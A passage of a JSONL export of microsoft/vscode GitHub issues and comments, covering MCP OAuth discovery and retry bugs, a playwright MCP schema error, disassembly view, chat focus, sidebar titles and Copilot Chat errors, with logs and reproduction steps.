https://datatracker.ietf.org/doc/html/rfc8414.\n\nI have the /auth/.well-known/openid-configuration\n\nSo, the client gets the unexpected token <!doctype (likely a 404 page). Then falls back on localhost. That is my guess.\nIt also strips off the /auth/ path. not sure what do do about that. does the 8414 spec expect the .well-known to be at the root of the domain, or can we adjust the client to append the .well-known after the give /auth?\n\nI can add the endpoint its looking for, but would be helpful, if it meets spec to not strip off the path portion.\n\n```\n2025-10-02 14:47:08.549 [debug] [editor -> server] {\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{\"roots\":{\"listChanged\":true},\"sampling\":{},\"elicitation\":{}},\"clientInfo\":{\"name\":\"Visual Studio Code\",\"version\":\"1.104.0\"}}}\n2025-10-02 14:47:08.552 [trace] Fetching https://localhost:8081/mcp with options: {\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/json\",\"Content-Length\":\"228\",\"Accept\":\"text/event-stream, application/json\"},\"body\":\"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2025-06-18\\\",\\\"capabilities\\\":{\\\"roots\\\":{\\\"listChanged\\\":true},\\\"sampling\\\":{},\\\"elicitation\\\":{}},\\\"clientInfo\\\":{\\\"name\\\":\\\"Visual Studio Code\\\",\\\"version\\\":\\\"1.104.0\\\"}}}\"}\n2025-10-02 14:47:08.607 [trace] Fetched https://localhost:8081/mcp: {\"status\":401,\"headers\":{\"date\":\"Thu, 02 Oct 2025 18:47:07 GMT\",\"server\":\"Kestrel\",\"transfer-encoding\":\"chunked\",\"www-authenticate\":\"Bearer realm=\\\"MCP\\\", resource_metadata=\\\"https://localhost:8081/.well-known/oauth-protected-resource\\\"\"}}\n2025-10-02 14:47:08.609 [trace] Fetching https://localhost:8081/.well-known/oauth-protected-resource with options: {\"method\":\"GET\",\"headers\":{\"Accept\":\"application/json\",\"MCP-Protocol-Version\":\"2025-06-18\"}}\n2025-10-02 14:47:08.652 [trace] Fetched https://localhost:8081/.well-known/oauth-protected-resource: {\"status\":200,\"headers\":{\"content-type\":\"application/json; charset=utf-8\",\"date\":\"Thu, 02 Oct 2025 18:47:07 GMT\",\"server\":\"Kestrel\",\"transfer-encoding\":\"chunked\"}}\n2025-10-02 14:47:08.653 [trace] Fetching https://my-auth-server.com/.well-known/oauth-authorization-server/auth with options: {\"method\":\"GET\",\"headers\":{\"Accept\":\"application/json\",\"MCP-Protocol-Version\":\"2025-06-18\"}}\n2025-10-02 14:47:08.865 [trace] Fetched https://my-auth-server.com/.well-known/oauth-authorization-server/auth: {\"status\":200,\"headers\":{\"connection\":\"keep-alive\",\"content-encoding\":\"gzip\",\"content-type\":\"text/html\",\"date\":\"Thu, 02 Oct 2025 18:47:08 GMT\",\"transfer-encoding\":\"chunked\",\"vary\":\"Accept-Encoding\",\"x-azure-ref\":\"20251002T184708Z-1668dccb65dgvpdghC1BL1pzgc0000000ts000000000afp0\",\"x-cache\":\"CONFIG_NOCACHE\",\"x-envoy-upstream-service-time\":\"3\"}}\n2025-10-02 14:47:08.867 [warning] Error populating auth metadata: SyntaxError: Unexpected token '<', \"<!doctype \"... is not valid JSON\n2025-10-02 14:47:13.549 [info] Waiting for server to respond to `initialize` request...\n```"}, {"author": "TylerLeonhardt", "body": "We do fallback, but the problem is that this function doesn't like that:\n1. you return a 200\n2. you return HTML and not JSON\n\nhttps://github.com/microsoft/vscode/blob/2a47b7b0e499b4b4e541415c212986a86af8178d/src/vs/workbench/api/common/extHostMcp.ts#L401-L455\n\nThis function should be more resistant not receiving JSON and fallback if so."}]}
{"repo": "microsoft/vscode", "issue_number": 270383, "issue_url": "https://github.com/microsoft/vscode/issues/270383", "issue_title": "MCP OAuth authentication fails to retry after server restart when scopes unchanged", "issue_author": "justinbmeyer", "issue_body": "The source of the problem: https://github.com/microsoft/vscode/blob/3ec367371fdb761eaf951bfeeb9b68b61272d21c/src/vs/workbench/api/common/extHostMcp.ts#L735\n\n### Summary\nVS Code's MCP client fails to retry OAuth authentication after server restarts when the OAuth scopes remain the same, leading to permanent connection failures until VS Code is restarted.\n\n### Environment\n- VS Code version: Latest (1.104.3)\n- Extension: Model Context Protocol (MCP) built-in support\n\n### Steps to Reproduce\n1. Set up an MCP server with OAuth authentication using in-memory token storage\n2. Connect VS Code to the server and complete OAuth flow successfully\n3. Restart the MCP server (invalidating all stored tokens)\n4. VS Code attempts to reconnect using cached token\n5. Server responds with 401 and same WWW-Authenticate scopes as before\n\n### Expected Behavior\nVS Code should detect the 401 response and initiate a fresh OAuth flow to obtain a new valid token.\n\n### Actual Behavior\nVS Code gives up after the second 401 response and marks the connection as failed with \"Server exited before responding to `initialize` request.\"\n\n### Root Cause Analysis\nThe issue is in the `_fetchWithAuthRetry` method in `McpHTTPHandle` ([source](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/api/common/extHostMcp.ts)):\n\n```typescript\n} else {\n    // We have auth metadata, but got a 401. Check if the scopes changed.\n    const { scopesChallenge } = this._parseWWWAuthenticateHeader(res);\n    if (!scopesMatch(scopesChallenge, this._authMetadata.scopes)) {\n        // Only retries here if scopes are different\n        this._authMetadata.scopes = scopesChallenge;\n        await this._addAuthHeader(headers);\n        // ... retry logic\n    }\n    // NO RETRY if scopes match but token is invalid!\n}\n```\n\n**Problem**: VS Code assumes that if OAuth scopes haven't changed, the cached token should still be valid. It doesn't account for server restarts that invalidate tokens while keeping scopes the same.\n\n### Logs\nVS Code client logs show:\n```\n[trace] Fetching http://localhost:3000/mcp (initial request)\n[trace] Fetched: {\"status\":401} (no auth header)\n[trace] Fetching http://localhost:3000/.well-known/oauth-authorization-server \n[trace] Fetched: {\"status\":200} (discovery successful)\n[trace] Fetching http://localhost:3000/mcp with \"Authorization\":\"***\"\n[trace] Fetched: {\"status\":401} (cached token rejected)\n[info] Connection state: Error 401 status\n[error] Server exited before responding to `initialize` request.\n```\n\n\n### Proposed Solution\nThe `_fetchWithAuthRetry` method should have a fallback when scopes match but authentication fails:\n\n```typescript\n} else {\n    // We have auth metadata, but got a 401. Check if the scopes changed.\n    const { scopesChallenge } = this._parseWWWAuthenticateHeader(res);\n    if (!scopesMatch(scopesChallenge, this._authMetadata.scopes)) {\n        this._log(LogLevel.Debug, `Scopes changed, updating and retrying`);\n        this._authMetadata.scopes = scopesChallenge;\n        await this._addAuthHeader(headers);\n        if (headers['Authorization']) {\n            init.headers = headers;\n            res = await doFetch();\n        }\n    } else {\n        // NEW: Retry even with same scopes - token might be invalid due to server restart\n        this._log(LogLevel.Debug, `Token rejected but scopes unchanged, forcing fresh token`);\n        await this._addAuthHeader(headers);\n        if (headers['Authorization']) {\n            init.headers = headers;\n            res = await doFetch();\n        }\n    }\n}\n```\n\n\n### Additional Context\nThis affects any MCP server using:\n- OAuth authentication \n- In-memory token storage (common in development)\n- Server restart scenarios (common in development and deployment)\n\nThe issue prevents proper development workflows and reduces the reliability of MCP authentication in production environments with rolling deployments.", "issue_labels": ["bug", "authentication", "insiders-released", "chat-mcp"], "comments": [{"author": "vs-code-engineering[bot]", "body": "Thanks for creating this issue! It looks like you may be using an old version of VS Code, the latest stable release is 1.104.3. Please try upgrading to the latest version and checking whether this issue remains.\n\nHappy Coding!"}, {"author": "justinbmeyer", "body": "Sorry, I was on the latest stable release: 1.104.3.  I asked Copilot to write up this issue. Didn't review enough! Updating the main text. This bug is in 1.104.3."}, {"author": "justinbmeyer", "body": "Also, in case it's useful, I found this problem while building this mcp training exercise: https://github.com/bitovi/mcp-training\n\nThe MCP server worked with claude and mcp-inspector, but not VSCode.  You can see the handlers here: https://github.com/bitovi/mcp-training/blob/main/src/auth/oauth-handlers.ts\n\nOriginally, I tried to make everything work with `@node-oauth/express-oauth-server`. However, VSCode has another spec bug that I had to address here: https://github.com/bitovi/mcp-training/blob/main/src/auth/oauth-handlers.ts#L237\n\nVSCode uses `resource_metadata_url` where the spec is `resource_metadata`"}, {"author": "justinbmeyer", "body": "If folks are looking for a workaround, you can create a dynamic scope that forces the comparison to fail:\n\n```\n  const serverInstanceScope = `server-instance-${serverStartTime.getTime()}`;\n  let authValue = `Bearer realm=\"mcp\", scope=\"${serverInstanceScope}\"`;\n``` "}, {"author": "TylerLeonhardt", "body": "@justinbmeyer \n\n> Root Cause Analysis\n\nthe code you've linked isn't live yet. It's in tomorrow's Insiders build. Have you tried this command?:\n```\n>Authentication: Remove Dynamic Authentication Providers\n```\n\n> VSCode uses resource_metadata_url where the spec is resource_metadata\n\nWhere do you see this?"}, {"author": "justinbmeyer", "body": "I didn't try that command. I didn't know it existed.  I'll try it Monday when I'm back to work on this.\n\n\n> Where do you see this? ( resource_metadata_url )\n\nI didn't see that in the code.  I saw this behavior as the only way to get the discovery endpoint to work correctly with VSCode.  I saw this a few weeks ago and have adopted this pattern since on multiple MCP services.  I can double check it's still happening with latest.  "}, {"author": "TylerLeonhardt", "body": "@justinbmeyer what does your MCP Server return when an invalid token is provided? I'm thinking about how I can take you through the auth flow automatically."}, {"author": "TylerLeonhardt", "body": "I'm gonna try and redo auth registrations on 401s and see how that goes. So long as your MCP Server returns a 401 when it gets an invalid token, it should go through the flow."}]}
{"repo": "microsoft/vscode", "issue_number": 270534, "issue_url": "https://github.com/microsoft/vscode/issues/270534", "issue_title": "Chat: `vscode-playwright-mcp` breaks GPT-5 chat request", "issue_author": "joaomoreno", "issue_body": "1. Open `vscode` folder\n2. Send a message to GPT-5\n\n\ud83d\udc1b Doesn't work\n\n\n[7a7cca22.copilotmd](https://github.com/user-attachments/files/22796312/7a7cca22.copilotmd)\n\n```\nSorry, your request failed. Please try again. Request id: 9418b9d0-bddd-4cd1-96ff-ab82f810bb6f\n\nReason: Request Failed: 400 {\"error\":{\"message\":\"Invalid schema for function 'mcp_vscode-playwr_vscode_automation_settings_add_user_settings': [{'type': 'string'}, {'type': 'string'}] is not of type 'object', 'boolean'.\",\"code\":\"invalid_request_body\"}}\n```\n\n<img width=\"1177\" height=\"777\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1eaaabb1-4f65-4f29-821f-b755a0a6e640\" />", "issue_labels": ["bug", "insiders-released"], "comments": [{"author": "vs-code-engineering[bot]", "body": "Hi @joaomoreno. As a member of the team, you can help us triage this issue by referring to https://github.com/microsoft/vscode-copilot/wiki/Copilot-Inbox-Tracker and assigning an owner directly."}, {"author": "joaomoreno", "body": "If I manually try to start that MCP server I get this:\n\n```\n2025-10-09 13:58:42.405 [info] Starting server vscode-playwright-mcp\n2025-10-09 13:58:42.406 [info] Connection state: Starting\n2025-10-09 13:58:42.406 [info] Starting server from LocalProcess extension host\n2025-10-09 13:58:42.410 [info] Connection state: Starting\n2025-10-09 13:58:42.411 [info] Connection state: Running\n2025-10-09 13:58:42.663 [warning] Failed to parse message: \"\\n\"\n2025-10-09 13:58:42.663 [warning] Failed to parse message: \"> code-oss-dev-mcp@0.1.0 start-stdio\\n\"\n2025-10-09 13:58:42.663 [warning] Failed to parse message: \"> npm run -s compile && node ./out/stdio.js\\n\"\n2025-10-09 13:58:42.663 [warning] Failed to parse message: \"\\n\"\n2025-10-09 13:58:45.787 [warning] Failed to parse message: \"src/playwright.ts(23,2): error TS2322: Type 'import(\\\"/Users/joao/Work/vscode/test/mcp/node_modules/@modelcontextprotocol/sdk/dist/esm/server/index\\\").Server<{ method: string; params?: { [x: string]: unknown; _meta?: { [x: string]: unknown; progressToken?: string | number | undefined; } | undefined; } | undefined; }, { method: string; params?: { [x: string]: unk...' is not assignable to type 'import(\\\"/Users/joao/Work/vscode/test/mcp/node_modules/@modelcontextprotocol/sdk/dist/cjs/server/index\\\").Server<{ method: string; params?: { [x: string]: unknown; _meta?: { [x: string]: unknown; progressToken?: string | number | undefined; } | undefined; } | undefined; }, { method: string; params?: { [x: string]: unk...'.\\n\"\n2025-10-09 13:58:45.787 [warning] Failed to parse message: \"  Types have separate declarations of a private property '_serverInfo'.\\n\"\n2025-10-09 13:58:45.811 [info] Connection state: Error Process exited with code 2\n```"}, {"author": "joaomoreno", "body": "This started working once I ran `npm install`.\n\n@TylerLeonhardt if we want to keep this as a default, built-in, MCP server for the vscode repo, please make it self contained and not depend on `npm install`. Also better warning/errors would be great. cc @connor4312 "}, {"author": "TylerLeonhardt", "body": "Running `npm ci` and an echo to point to the README."}]}
{"repo": "microsoft/vscode", "issue_number": 270593, "issue_url": "https://github.com/microsoft/vscode/issues/270593", "issue_title": "Problem with disassembly view", "issue_author": "DrSergei", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.104.3\n- OS Version: Windows (WSL)\n\nSteps to Reproduce:\n\n0. Reload VSCode window.\n1. Install [lldb-dap](https://marketplace.visualstudio.com/items?itemName=llvm-vs-code-extensions.lldb-dap) extension and install latest binaries from LLVM release.\n2. Create test C++-program and compile it with debug symbols (`g++ -g main.cpp -o main.exe`).\n```cpp\n#include <iostream>\n\nint main() {\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    std::cout << \"Hello, world!\" << std::endl;\n    return 0;\n}\n```\n\n3. Create launch configuration.\n```json\n       {\n            \"type\": \"lldb-dap\",\n            \"request\": \"launch\",\n            \"name\": \"Launch (lldb-dap)\",\n            \"program\": \"${workspaceFolder}/main.exe\",\n            \"args\": [],\n            \"cwd\": \"${workspaceRoot}\",\n        },\n```\n\n4. Set breakpoint on first line of main function and start debugging.\n5. Right click on line and select \"Open disassembly view\".\n6. Stop debugging.\n7. Start debugging again. You can see error message about incorrect request.\n8. Try scroll dissambly view (not working).\n\n![Image](https://github.com/user-attachments/assets/fdd57d87-62ac-40ae-a17e-a44de3236d25)\n\nDebug adapter log:\n```\n1760027123.970161676 (stdio) --> {\"command\":\"disassemble\",\"arguments\":{\"memoryReference\":\"\",\"offset\":0,\"instructionOffset\":-50,\"instructionCount\":50,\"resolveSymbols\":true},\"type\":\"request\",\"seq\":8}\n1760027123.970287323 (stdio) queued (command=disassemble seq=8)\n1760027123.970568419 (stdio) <-- {\"body\":{\"error\":{\"format\":\"invalid arguments for request 'disassemble': malformed memory reference at arguments.memoryReference\\n{\\n  \\\"instructionCount\\\": 50,\\n  \\\"instructionOffset\\\": -50,\\n  \\\"memoryReference\\\": /* error: malformed memory reference */ \\\"\\\",\\n  \\\"offset\\\": 0,\\n  \\\"resolveSymbols\\\": true\\n}\",\"id\":3,\"showUser\":true}},\"command\":\"disassemble\",\"request_seq\":8,\"seq\":0,\"success\":false,\"type\":\"response\"}\n```\n\nOrigianl [PR](https://github.com/microsoft/vscode/pull/270361).", "issue_labels": ["bug", "debug", "insiders-released"], "comments": [{"author": "vs-code-engineering[bot]", "body": "Thanks for creating this issue! It looks like you may be using an old version of VS Code, the latest stable release is 1.104.3. Please try upgrading to the latest version and checking whether this issue remains.\n\nHappy Coding!"}]}
{"repo": "microsoft/vscode", "issue_number": 270666, "issue_url": "https://github.com/microsoft/vscode/issues/270666", "issue_title": "Focus keeps moving to chat any time the output is updated", "issue_author": "connor4312", "issue_body": "1. Have an agent session going\n2. Try to work anywhere else in the editor\n3. Focus moves to the chat editor any time the response updates\n\nObserve my failed attempt to read Charles Dickens. I keep clicking and trying to type in the terminal:\n\nhttps://github.com/user-attachments/assets/9d20162f-0b2a-466e-894b-7d6ed7ac092c", "issue_labels": ["bug", "important", "insiders-released", "chat"], "comments": [{"author": "svg153", "body": "It's quite annoying. I'm already used to working with multiple active chat windows, and this makes it impossible :S\nIf it could be fixed it would be perfect. Thank you very much."}]}
{"repo": "microsoft/vscode", "issue_number": 269862, "issue_url": "https://github.com/microsoft/vscode/issues/269862", "issue_title": "Customize the Primary Sidebar's title", "issue_author": "nanopink", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! feature_request_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- Please search existing issues to avoid creating duplicates. -->\n\n<!-- Describe the feature you'd like. -->\n<img width=\"187\" height=\"84\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/13ff2754-455e-44fe-82c7-d63f23c7b5b1\" />\n\nWe have to expand the whole sidebar width just to see the full folder's name, it feels obnoxious.\n\n<img width=\"243\" height=\"142\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/cd0d490e-afe9-4b33-8083-28c8c6c2b246\" />\n\nHaving the ability to change the display of it how we desire would be great.\nIn my case I would like to simply remove `Folders: `\nPlus the active icon in the activity bar is already my display of what I should be looking at, no need to label it.\n\nSomeone already recommended this [here](https://github.com/microsoft/vscode/issues/169809) and the maintainers said they are happy to reconsider and I believe it has to be reconsidered.\nMore flexibility is always welcome, especially since we can do it on the window title already.", "issue_labels": ["bug", "file-explorer", "insiders-released"], "comments": [{"author": "benibenj", "body": "This is happening because you move the explorer view out of it's container which leads to the `Folders: ` being prefixed to indicate the view you are in, by default we do not show the `Folders: ` prefix. I agree it should be the same in this scenario."}]}
{"repo": "microsoft/vscode", "issue_number": 269044, "issue_url": "https://github.com/microsoft/vscode/issues/269044", "issue_title": "Add action to remove history entries", "issue_author": "chrmarti", "issue_body": "Testing #268983\n\nHaving a context menu entry or an inline action on history entries to remove them would be nice.\n\n<img width=\"450\" height=\"282\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/63103bc6-98f8-4ff1-bc93-5d14093f8ffb\" />", "issue_labels": ["bug"], "comments": [{"author": "osortega", "body": "They should all have an inline action to delete. The only case where you would see this is if you didn't interact with the chat session yet, it won't be saved so if you close the editor it should dissappear.\nOr maybe if you are encountering this other bug https://github.com/microsoft/vscode/issues/252849 I believe you wouldn't be able to delete those either\n\n "}]}
{"repo": "microsoft/vscode", "issue_number": 258862, "issue_url": "https://github.com/microsoft/vscode/issues/258862", "issue_title": "`Run command in terminal` editor sometimes collapses to nothing", "issue_author": "mjbvz", "issue_body": "1. Ask agent to run a terminal command\n2. Try editing it, scrolling around, and minimizing/expanding the chat panel\n\n**Bug**\nSometimes after trying to edit again, the terminal input editor collapse to have zero height:\n\n<img width=\"627\" height=\"275\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6fd18484-5b05-4eab-878c-a8da57010fa8\" />\n\nI don't see any errors in the logs when this happens", "issue_labels": ["bug", "*duplicate", "chat-terminal"], "comments": [{"author": "Tyriar", "body": "@bhavyaus saw this too\n\nI've tried to figure out a repro for it but really struggling unfortunately."}, {"author": "Tyriar", "body": "Just happened by using my browser for a while \ud83e\udd37 \n\n<img width=\"562\" height=\"199\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8bea9ecc-640a-4c2d-a27a-690b3141a137\" />\n\nDOM is showing the monaco instance doesn't exist anymore:\n\n<img width=\"1000\" height=\"1236\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/be6caa0c-d81a-4b97-a7cf-b6e9f982bd7a\" />\n\nExpected:\n\n<img width=\"972\" height=\"538\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/619c6b22-5dac-451f-bee0-dd81839b6edd\" />"}, {"author": "Tyriar", "body": "This has been fixed for a while"}]}
{"repo": "microsoft/vscode", "issue_number": 261648, "issue_url": "https://github.com/microsoft/vscode/issues/261648", "issue_title": "Remove command line preview from always allow exact command line menu item", "issue_author": "Tyriar", "issue_body": "https://github.com/microsoft/vscode/blob/1a1ee2dc0c6ad9104fefa08a8cc58eee5cd80027/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/runInTerminalTool.ts#L975", "issue_labels": ["bug", "verified", "insiders-released", "chat-terminal"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 259649, "issue_url": "https://github.com/microsoft/vscode/issues/259649", "issue_title": "Github.dev: SCM status entries collide with their identifier", "issue_author": "bpasero", "issue_body": "<img width=\"412\" height=\"391\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bdc0992a-7571-4780-827e-648da2723502\" />\n\nNotice how the ID is appended for the SCM entries when you right click into the status bar on GitHub.dev. I saw this on https://github.dev/microsoft/vscode/pull/258206", "issue_labels": ["bug", "verified", "scm", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263013, "issue_url": "https://github.com/microsoft/vscode/issues/263013", "issue_title": "Copilot Chat error \u201cIllegal state: service accessor is only valid during the invocation of its target method\u201d when chat.edits2.enabled = true and sending a prompt", "issue_author": "thinkingserious", "issue_body": "Type: <b>Bug</b>\n\n### Bug type\nCopilot Chat error when sending a prompt with `chat.edits2.enabled = true`\n\n### Environment\n- VS Code Insiders: `1.104.0-insider` (`df6568066e88d67331cec7a12a34bdef058fb62b`) \u2014 built 2025\u201108\u201122\n- OS: macOS `Darwin arm64 24.6.0`\n- Electron: `37.2.3`\n- Chromium: `138.0.7204.100`\n- Node.js: `22.17.0`\n- V8: `13.8.500258-electron.0`\n\nExtensions (minimal to repro)\n- GitHub Copilot: `1.360.1752`\n- GitHub Copilot Chat: `0.31.2025082213`\n\n### Minimal settings to reproduce\n```json\n{\n  \"editor.inlineSuggest.enabled\": true,\n  \"github.copilot.enable\": { \"*\": true },\n  \"chat.edits2.enabled\": true\n}\n```\n\n### Steps to reproduce\n1. Start VS Code Insiders.\n2. Open the Copilot Chat view.\n3. Send any prompt.\n\n### Expected\nPrompt is processed and a response is returned.\n\n### Actual\nAn error appears:\n```\nIllegal state: service accessor is only valid during the invocation of its target method\n```\nNotes:\n- Copilot inline suggestions and the inline \u201cFix\u201d command continue to work.\n- The issue triggers specifically when sending a prompt in the Copilot Chat UI.\n\n### Repro scope\n- Reproduces in a clean Temporary Profile with only Copilot and Copilot Chat installed, after setting `\"chat.edits2.enabled\": true`.  \n- Disabling the flag (`\"chat.edits2.enabled\": false`) immediately stops the issue.\n- Extension Bisect did not identify another conflicting extension.\n\n### Does this issue occur when all extensions are disabled?\nN/A \u2014 the feature under test (Copilot Chat) requires the Copilot extensions to be enabled. Per the VS Code guidance, this has been minimized to only the required extensions and also reproduced in a Temporary Profile.\n\n### Workaround\nSet:\n```json\n\"chat.edits2.enabled\": false\n```\nThen \u201cDeveloper: Reload Window\u201d.\n\n### Additional context\n- I can reproduce consistently by toggling only the single setting above.\n- Not yet tested on VS Code Stable.\n\n### Reporting notes (per guidelines)\n- Includes exact VS Code/OS versions, installed extensions, minimal steps, and minimal settings that reproduce.\n\nThank you!\n\nExtension version: 0.31.2025082213\nVS Code version: Code - Insiders 1.104.0-insider (df6568066e88d67331cec7a12a34bdef058fb62b, 2025-08-22T17:09:01.208Z)\nOS version: Darwin arm64 24.6.0\nModes:\n\n<details><summary>Logs</summary>\n<pre>\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: not empty selection\nTrace: No test results\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: document not tracked - does not have recent changes\nTrace: No test results\nTrace: ChatStatusWorkspaceIndexingStatus::updateStatusItem(id=5): starting\nTrace: CodeSearchRepoTracker::initialize#5 started\nTrace: CodeSearchRepoTracker::initialize#5 success. Elapsed 0.10041699999419507\nTrace: ChatStatusWorkspaceIndexingStatus::_writeStatusItem()\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] Return: document not tracked - does not have recent changes\nTrace: No test results\nTrace: [NES][Triggerer][onDidChangeTextEditorSelection] created\nTrace: No test results\nTrace: ChatStatusWorkspaceIndexingStatus::updateStatusItem(id=6): starting\nTrace: CodeSearchRepoTracker::initialize#6 started\nTrace: CodeSearchRepoTracker::initialize#6 success. Elapsed 0.060833000010461546\nTrace: ChatStatusWorkspaceIndexingStatus::_writeStatusItem()\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: false.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: true.\nDebug: [context keys] Window state change. Needs offline check: false, active: false, focused: true.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: true.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: false.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: true.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: false.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: true.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: false.\nDebug: [context keys] Window state change. Needs offline check: false, active: true, focused: true.\n</pre>\n</details>\n<details><summary>Request IDs</summary>\n<pre>\n2d22ab1b-c884-4e9a-9ba5-e9091c944a88\n</pre>\n</details><details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M3 Pro (11 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|2, 2, 2|\n|Memory (System)|36.00GB (1.39GB free)|\n|Process Argv|--crash-reporter-id 087501ec-7d72-49d1-aad1-73f1c092aeb7|\n|Screen Reader|no|\n|VM|0%|\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\npythonvspyt551cf:31249598\nnes-control-group:31372001\nnativeloc1:31118317\ndwcopilot:31158714\ndwoutputs:31242946\ncopilot_t_ci:31333650\ng012b348:31231168\npythoneinst12:31251391\n6gi0g917:31259950\n996jf627:31264550\npythonrdcb7:31268811\nusemplatestapi:31297334\n747dc170:31275146\npythonpcpt1cf:31345881\n6518g693:31302842\n9d2cg352:31346308\nb99bg931:31349649\n0g1h6703:31329154\nagentisdefault:31372185\n4f60g487:31327383\nnes-emitfast-1:31333560\ntestaa123cf:31335227\nonetestforazureexpcf:31335614\n63221493:31336333\nenvsactivate1:31349248\n0927b901:31340060\ncustommodel3t:31371782\n0ej4-default:31345954\neditstats-enabled:31346256\njusteven_python_cf:31371805\ngendocstringt:31371829\nasdad:31365766\ngemagent1cf:31368470\ncloudbuttont:31366566\naihoversummaries_f:31371859\ntodos-0:31366869\nsearch_len1:31370369\nmultireplacestring:31369945\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "chat"], "comments": [{"author": "iwangbowen", "body": "It happened to me. I didn't know it was caused by the setting `chat.edits2.enabled = true`"}]}
